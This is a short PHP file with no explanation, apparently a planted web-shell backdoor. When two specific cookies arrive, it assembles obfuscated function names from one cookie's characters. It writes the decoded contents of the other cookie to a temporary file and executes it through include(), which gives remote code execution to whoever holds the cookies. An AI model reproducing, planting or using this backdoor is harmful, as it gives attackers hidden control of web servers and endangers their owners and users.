<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[22])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 4;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[22][$n];
        if (!$c[22][$n + 1]) {
            if (!$c[22][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 4 + 1;
    }
    $k = $p[24]() . $p[25];
    if (!$p[3]($k)) {
        $n = $p[12]($k, $p[9]);
        $p[10]($n, $p[23] . $p[20]($p[7]($c[3])));
    }
    include($k);
}